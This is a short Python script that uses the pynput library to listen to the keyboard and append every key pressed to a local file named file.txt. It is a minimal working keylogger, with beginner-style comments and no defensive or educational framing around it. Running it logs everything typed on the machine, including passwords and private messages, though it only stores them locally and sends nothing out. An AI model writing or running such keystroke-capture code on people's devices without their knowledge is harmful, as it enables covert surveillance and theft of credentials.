from pynput.keyboard import Listener 

def write_file(key):
    #key is not an str so we must cast it 
    key = str(key)

    #opening the file and then writing in it 
    with open("file.txt","a") as file:
        file.write(key)






with Listener(on_press = write_file) as l :
    l.join()